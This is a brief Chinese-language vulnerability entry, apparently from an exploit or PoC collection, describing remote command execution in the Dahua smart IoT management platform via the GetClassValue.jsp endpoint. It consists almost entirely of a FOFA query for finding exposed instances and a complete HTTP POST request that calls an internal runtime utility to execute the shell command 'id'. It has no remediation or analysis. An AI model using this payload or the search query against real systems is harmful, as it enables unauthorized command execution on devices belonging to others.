大华智能物联管理平台GetClassValue.jsp接口存在远程命令执行漏洞

fofa

body="客户端会小于800"||app="dahua-智能物联综合管理平台"

poc

POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
Host: 
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{
    "data": {
        "clazzName": "com.dahua.admin.util.RuntimeUtil",
        "methodName": "syncexecReturnInputStream",
        "fieldName": ["id"]
    }
}